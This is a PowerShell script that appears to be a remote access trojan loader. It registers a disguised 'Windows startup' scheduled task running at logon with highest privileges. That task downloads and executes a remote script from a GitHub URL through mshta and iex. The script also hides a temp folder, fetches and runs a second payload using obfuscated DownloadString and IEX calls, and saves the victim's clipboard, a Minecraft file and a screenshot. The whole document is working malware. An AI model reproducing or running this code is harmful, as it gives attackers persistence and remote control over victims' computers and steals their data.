$task_name = "Windows startup"
$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/main.ps1')|iex`",0)(window.close)"
$task_trigger = New-ScheduledTaskTrigger -AtLogOn
$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force

$dir = "$env:temp\loader"
New-Item -ItemType Directory -Path $dir
attrib +h +s $dir
cd $dir
Set-Location -Path $dir

$shellcode = ("https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/shell/data.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
$proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
$proc.WaitForExit()

Get-Clipboard | Out-File -FilePath "clip.txt" -Encoding utf8

Copy-Item -Path "$env:APPDATA\.minecraft\hotbar.nbt" -Destination "$dir\hotbar.nbt"

Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait('{PRTSC}')
Start-Sleep -Milliseconds 500
$img = [System.Windows.Forms.Clipboard]::GetImage()
$img.Save('screenshot.png')

